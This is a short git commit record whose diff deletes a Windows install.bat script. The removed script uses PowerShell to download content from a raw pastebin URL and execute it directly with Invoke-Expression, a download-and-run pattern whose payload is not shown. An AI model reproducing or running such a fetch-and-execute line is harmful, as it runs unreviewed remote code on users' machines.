54498bf710d7b2e9785769bba7b1192ef2d2ef00
wuw-shz <wuw62481@gmail.com>
2024-06-23 20:56:12 +0700

    @wuw.sh

--- install.bat
+++
@@ -1,6 +0,0 @@
-@echo off
-setlocal
-
-powershell -Command "Invoke-WebRequest -Uri 'https://pastebin.com/raw/Ep4f8kq2' -UseBasicParsing | Select-Object -ExpandProperty Content | Invoke-Expression"
-
-endlocal
